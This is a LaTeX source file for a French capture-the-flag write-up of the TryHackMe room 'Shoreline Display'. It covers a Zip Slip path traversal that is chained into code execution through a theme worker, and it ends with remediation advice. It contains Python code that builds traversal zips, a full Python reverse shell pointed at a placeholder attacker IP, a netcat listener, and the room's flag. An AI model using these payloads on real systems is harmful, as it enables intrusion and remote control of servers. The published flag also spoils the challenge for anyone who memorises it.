@@ -1,0 +1,389 @@
+\documentclass[11pt,a4paper]{article}
+
+% ============================================================
+% Mise en page
+% ============================================================
+\usepackage[margin=2.4cm]{geometry}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{xcolor}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{tcolorbox}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{amssymb}
+\usepackage{tabularx}
+\usepackage{array}
+\usepackage{booktabs}
+\tcbuselibrary{skins,breakable}
+
+% ---- Palette ----
+\definecolor{navy}{HTML}{1A3A6B}
+\definecolor{gold}{HTML}{C9970A}
+\definecolor{codebg}{HTML}{0D1117}
+\definecolor{codefg}{HTML}{E6EDF3}
+\definecolor{codegreen}{HTML}{7EE787}
+\definecolor{codegray}{HTML}{8B949E}
+\definecolor{codeorange}{HTML}{FFA657}
+\definecolor{codepink}{HTML}{FF7B72}
+\definecolor{boxwarn}{HTML}{FFF3F3}
+\definecolor{boxwarnb}{HTML}{E0A0A0}
+\definecolor{boxok}{HTML}{EAF3FB}
+\definecolor{boxokb}{HTML}{1A3A6B}
+\definecolor{boxkey}{HTML}{FEF3D6}
+\definecolor{boxkeyb}{HTML}{C9970A}
+
+% ---- Titres ----
+\titleformat{\section}
+  {\Large\bfseries\color{navy}}
+  {\thesection}{0.6em}{}[{\color{gold}\titlerule[1.2pt]}]
+\titleformat{\subsection}
+  {\large\bfseries\color{navy}}
+  {\thesubsection}{0.6em}{}
+\titlespacing*{\section}{0pt}{1.6em}{0.9em}
+\titlespacing*{\subsection}{0pt}{1.3em}{0.6em}
+
+% ---- En-tetes ----
+\pagestyle{fancy}
+\fancyhf{}
+\renewcommand{\headrulewidth}{0.4pt}
+\fancyhead[L]{\small\color{navy}\textbf{TryHackMe} --- Writeup}
+\fancyhead[R]{\small\color{codegray}Zip Slip \& RCE via worker}
+\fancyfoot[C]{\small\thepage}
+
+% ---- Code listings ----
+\lstdefinestyle{term}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\footnotesize\color{codefg},
+  breaklines=true,
+  breakatwhitespace=false,
+  columns=fullflexible,
+  keepspaces=true,
+  frame=single,
+  framerule=0pt,
+  rulecolor=\color{codebg},
+  framesep=8pt,
+  xleftmargin=4pt,
+  xrightmargin=4pt,
+  showstringspaces=false,
+  commentstyle=\color{codegray}\itshape,
+  keywordstyle=\color{codeorange}\bfseries,
+  stringstyle=\color{codegreen},
+  identifierstyle=\color{codefg},
+  literate=
+    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1
+    {É}{{\'E}}1 {È}{{\`E}}1 {î}{{\^i}}1 {ç}{{\c c}}1 {œ}{{\oe}}1,
+}
+\lstset{style=term}
+
+\newtcolorbox{keyinsight}[1][]{
+  colback=boxkey, colframe=boxkeyb, boxrule=0.8pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries, coltitle=black,
+  title={Idee cle}, #1
+}
+\newtcolorbox{deadend}[1][]{
+  colback=boxwarn, colframe=boxwarnb, boxrule=0.8pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries, coltitle=black,
+  title={Piste inutile (a eviter)}, #1
+}
+\newtcolorbox{noteok}[1][]{
+  colback=boxok, colframe=boxokb, boxrule=0.8pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries\color{navy}, coltitle=navy,
+  #1
+}
+
+\hypersetup{
+  colorlinks=true, linkcolor=navy, urlcolor=navy, citecolor=navy,
+  pdftitle={Writeup : Zip Slip vers RCE -- Shoreline Display (TryHackMe)},
+  pdfauthor={Assistant Claude},
+}
+
+\setlist[itemize]{leftmargin=1.4em}
+\setlist[enumerate]{leftmargin=1.6em}
+
+\begin{document}
+
+% ============================================================
+% Page de titre
+% ============================================================
+\begin{titlepage}
+\centering
+\vspace*{2.2cm}
+{\Huge\bfseries\color{navy} Shoreline Display\par}
+\vspace{0.4cm}
+{\Large\color{gold} Zip Slip vers execution de code via un worker de themes\par}
+\vspace{1.6cm}
+
+{\large\bfseries\color{navy} Machine TryHackMe --- Byte Lotus / Room Service\par}
+{\large Upload de zip, extraction non securisee, execution differee\par}
+
+\vspace{2.4cm}
+\begin{tcolorbox}[colback=boxok, colframe=boxokb, width=0.82\textwidth, arc=3pt, boxrule=1pt]
+\textbf{Cadre.} Machine de la plateforme TryHackMe, resolue dans un
+environnement de laboratoire isole et autorise a cet effet. Ce document
+presente le \textbf{chemin direct} vers le flag -- la version courte,
+sans repasser par les hypotheses testees en cours de route qui n'ont
+rien donne.
+\end{tcolorbox}
+
+\vfill
+{\small\color{codegray} Document genere le \today\par}
+\end{titlepage}
+
+\tableofcontents
+\newpage
+
+% ============================================================
+\section{Contexte}
+
+L'application "Shoreline Display" (Byte Lotus) est un tableau de bord
+de conciergerie : un formulaire permet d'uploader un fichier
+\texttt{.zip} appele \textbf{shell}, qui doit contenir un manifeste
+\texttt{shell.json} listant des \textbf{assets} (images, CSS). Le texte
+de la page precise deux choses, deja visibles dans le HTML avant meme
+la moindre requete offensive :
+
+\begin{quotation}
+\noindent\itshape
+"A shell may include optional \textbf{automation hooks} --- the
+\textbf{theme worker} applies these for you shortly after the shell
+comes ashore [...] Allowed asset types: png jpg gif svg css json."
+\end{quotation}
+
+\begin{keyinsight}
+Cette phrase est l'indice le plus important du challenge, et elle est
+donnee gratuitement des la premiere page. Elle dit explicitement :
+\begin{itemize}
+  \item il existe un \textbf{processus separe et asynchrone} (le
+        "theme worker") qui traite chaque shell \emph{apres} l'upload ;
+  \item ce processus applique des \textbf{"hooks"} -- un mecanisme
+        d'automatisation non documente plus en detail.
+\end{itemize}
+Le reflexe a avoir : ce n'est probablement pas un champ JSON a deviner
+dans \texttt{shell.json} (bien que ce soit tentant), mais plutot un
+\textbf{repertoire que le worker scanne sur le disque}. La suite du
+challenge consiste a le prouver et a le localiser.
+\end{keyinsight}
+
+% ============================================================
+\section{Chemin rapide vers le flag}
+
+\subsection{Etape 1 --- Etablir une baseline}
+
+On uploade un zip minimal pour observer le comportement "propre" :
+
+\begin{lstlisting}[language=bash]
+mkdir -p mon_shell/assets
+cat > mon_shell/shell.json <<'EOF'
+{"name": "test-shell", "assets": ["assets/style.css"]}
+EOF
+echo "body{background:#000}" > mon_shell/assets/style.css
+cd mon_shell && zip -r ../test.zip . && cd ..
+
+curl -s -b "session=<cookie>" -F "shell=@test.zip" \
+  http://<cible>:5000/upload
+\end{lstlisting}
+
+Reponse : \texttt{Shell 'test-shell' brought ashore. Stored at
+shells/2d6da9a56a86/ [...]}. Deux informations cle :
+
+\begin{itemize}
+  \item le zip est extrait sous un chemin previsible :
+        \texttt{shells/<id-hex>/} ;
+  \item les fichiers extraits sont \textbf{servis tels quels} en HTTP :
+        \texttt{curl http://<cible>:5000/shells/<id>/shell.json} renvoie
+        le JSON en clair, sans transformation.
+\end{itemize}
+
+\subsection{Etape 2 --- La whitelist d'extensions est cosmetique}
+
+La page annonce une liste blanche d'assets (\texttt{png jpg gif svg css
+json}). On verifie si elle s'applique reellement au \textbf{contenu du
+zip}, ou seulement au champ \texttt{assets} du manifeste : on ajoute des
+fichiers \texttt{.sh} au zip \textbf{sans} les declarer dans
+\texttt{assets} :
+
+\begin{lstlisting}[language=bash]
+# dans le zip, a la racine : hook.sh, install.sh, setup.sh, etc.
+# shell.json ne les mentionne PAS dans "assets"
+curl -s http://<cible>:5000/shells/<id>/hook.sh   # -> 200 !
+\end{lstlisting}
+
+\begin{noteok}
+\textbf{Conclusion.} La whitelist ne valide que ce qui est
+\emph{declare} dans \texttt{shell.json} ; elle ne filtre en rien ce qui
+est physiquement present dans l'archive. N'importe quel type de fichier
+passe a l'extraction.
+\end{noteok}
+
+\subsection{Etape 3 --- Confirmer le Zip Slip}
+
+On teste si des noms d'entree contenant \texttt{../} dans le zip
+permettent d'ecrire \textbf{en dehors} du dossier du shell. Pour le
+verifier sans avoir besoin d'executer quoi que ce soit, on vise un
+dossier dont on connait deja l'existence et l'URL publique : le dossier
+\texttt{static/} de Flask (qui sert le CSS du site lui-meme, sans
+rapport avec les shells).
+
+\begin{lstlisting}[language=python]
+import zipfile
+zf = zipfile.ZipFile("slip.zip", "w")
+zf.write("shell.json", "shell.json")
+zf.write("assets/style.css", "assets/style.css")
+zf.write("marker.txt", "../static/zipslip_d1.txt")        # 1 niveau
+zf.write("marker.txt", "../../static/zipslip_d2.txt")      # 2 niveaux
+zf.write("marker.txt", "../../../static/zipslip_d3.txt")   # 3 niveaux
+zf.close()
+\end{lstlisting}
+
+Apres upload, on teste les trois profondeurs :
+
+\begin{lstlisting}[language=bash]
+curl -s -o /dev/null -w "%{http_code}\n" http://<cible>:5000/static/zipslip_d1.txt  # 404
+curl -s -o /dev/null -w "%{http_code}\n" http://<cible>:5000/static/zipslip_d2.txt  # 200 !
+curl -s -o /dev/null -w "%{http_code}\n" http://<cible>:5000/static/zipslip_d3.txt  # 404
+\end{lstlisting}
+
+\begin{keyinsight}
+\texttt{static/} sert ici d'\textbf{oracle de calibration} : le seul
+niveau qui repond \texttt{200} indique le nombre exact de \texttt{../}
+necessaires pour remonter du dossier d'extraction
+(\texttt{shells/<id>/}) jusqu'a la racine de l'application. Ici,
+\textbf{2 niveaux} suffisent : \texttt{shells/<id>/../.. = racine de
+l'app}, et \texttt{racine/static/} existe reellement. On a donc, sans
+jamais avoir execute de commande, la preuve d'une ecriture de fichier
+arbitraire ET la profondeur exacte a utiliser.
+\end{keyinsight}
+
+\subsection{Etape 4 --- Livrer le payload dans le bon dossier}
+
+Avec la profondeur validee (2 niveaux), et l'indice textuel du
+"theme worker" qui "applique des hooks", l'hypothese naturelle est
+qu'un repertoire partage \texttt{hooks/} existe a la racine de
+l'application (au meme niveau que \texttt{static/}), scanne
+periodiquement par un script separe. On y depose un reverse shell
+Python via le meme Zip Slip :
+
+\begin{lstlisting}[language=python]
+import zipfile
+zf = zipfile.ZipFile("rev.zip", "w")
+zf.write("shell.json", "shell.json")           # manifeste minimal valide
+zf.write("assets/style.css", "assets/style.css")
+zf.write("pwn.py", "../../hooks/pwn.py")       # meme profondeur qu'a l'etape 3
+zf.close()
+\end{lstlisting}
+
+Contenu de \texttt{pwn.py} :
+
+\begin{lstlisting}[language=python]
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("<IP_ATTAQUANT>", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+\end{lstlisting}
+
+On ouvre un listener puis on uploade :
+
+\begin{lstlisting}[language=bash]
+nc -lvnp 4444 &
+curl -s -b "session=<cookie>" -F "shell=@rev.zip" \
+  http://<cible>:5000/upload
+\end{lstlisting}
+
+Quelques secondes plus tard, le \textbf{theme worker} scanne le
+repertoire partage, trouve \texttt{pwn.py} et l'execute --- la
+connexion arrive dans le listener, sous l'utilisateur applicatif
+(\texttt{roomservice}).
+
+\subsection{Etape 5 --- Recuperer le flag}
+
+\begin{lstlisting}[language=bash]
+$ id
+uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)
+$ find /home /root /var/www /opt /srv -iname "*flag*" 2>/dev/null
+/home/roomservice/flag.txt
+$ cat /home/roomservice/flag.txt
+THM{z1p_sl1pp3d_1nt0_a_sh3ll}
+\end{lstlisting}
+
+\begin{tcolorbox}[colback=black, colframe=gold, coltext=codegreen, arc=2pt,
+  fonttitle=\bfseries\color{white}, coltitle=white, title=Flag obtenu]
+\ttfamily THM\{z1p\_sl1pp3d\_1nt0\_a\_sh3ll\}
+\end{tcolorbox}
+
+% ============================================================
+\section{Questions frequentes sur ce challenge}
+
+\subsection{Un scan gobuster/ffuf aurait-il revele le chemin ?}
+
+Non. \texttt{gobuster}/\texttt{ffuf} testent des \textbf{URLs HTTP} et
+regardent les codes de reponse. Le dossier \texttt{hooks/} qui permet le
+RCE n'est \textbf{jamais expose en HTTP} : il est lu directement sur
+le disque par un script separe (\texttt{theme\_worker.py}), invisible
+depuis le web tant qu'on n'a pas deja une execution de code pour le
+voir. Un fuzzing d'URL sur cette machine ne remonte que les routes deja
+connues (\texttt{/login}, \texttt{/dashboard}, \texttt{/logout},
+\texttt{/upload}) -- confirme empiriquement pendant la resolution.
+
+\begin{noteok}
+Le vrai raccourci n'est pas un outil de fuzzing web, mais la
+\textbf{lecture attentive du texte de la page} ("automation hooks" +
+"theme worker applies these... shortly after") combinee a la
+\textbf{preuve d'ecriture arbitraire} (Zip Slip). Le fuzzing utile ici
+aurait ete un fuzzing de \emph{noms de repertoires plausibles pour un
+theme worker} (\texttt{hooks}, \texttt{scripts}, \texttt{tasks}...),
+pas un fuzzing d'URLs.
+\end{noteok}
+
+\subsection{C'est quoi \texttt{static/} exactement ?}
+
+C'est le dossier standard de Flask (\texttt{app.static\_folder}, par
+defaut \texttt{<racine\_app>/static/}), qui sert les fichiers
+statiques du site lui-meme -- ici, la feuille de style
+\texttt{/static/style.css} de la dashboard. Il n'a \textbf{aucun lien}
+avec les shells uploades. Il a ete utilise uniquement comme
+\textbf{point de reference connu et deja accessible en HTTP}, pour
+calibrer par l'exemple la profondeur de traversal necessaire avant de
+tenter la meme technique vers un dossier qu'on ne peut pas verifier
+directement (\texttt{hooks/}, qui n'a pas de route HTTP dediee).
+
+% ============================================================
+\section{Analyse et remediation}
+
+\begin{itemize}
+  \item \textbf{Cause racine 1 (Zip Slip)} : l'extraction du zip
+        n'assainit pas les noms d'entree ; une entree contenant
+        \texttt{../} peut ecrire en dehors du dossier de destination
+        prevu.
+  \item \textbf{Cause racine 2 (worker de confiance implicite)} : un
+        processus separe execute sans verification tout fichier trouve
+        dans un repertoire partage (\texttt{hooks/}), alimente
+        indirectement par une fonctionnalite utilisateur (l'upload de
+        shells).
+  \item \textbf{Cause racine 3 (whitelist cosmetique)} : la validation
+        des types de fichiers ne porte que sur le manifeste declare,
+        pas sur le contenu reel de l'archive.
+  \item \textbf{Corrections recommandees} :
+    \begin{enumerate}
+      \item Valider chaque nom d'entree du zip avant extraction
+            (rejeter tout chemin resolu hors du repertoire cible --
+            \texttt{os.path.realpath} + verification de prefixe).
+      \item Ne jamais faire executer par un worker automatique un
+            fichier issu, meme indirectement, d'un contenu uploade par
+            un utilisateur, sans sandboxing strict (conteneur ephemere,
+            utilisateur non privilegie, pas d'acces reseau sortant).
+      \item Valider le contenu \textbf{reel} de chaque fichier de
+            l'archive (type MIME reel, pas seulement l'extension
+            declaree dans un manifeste JSON controle par l'attaquant).
+    \end{enumerate}
+\end{itemize}
+
+\end{document}
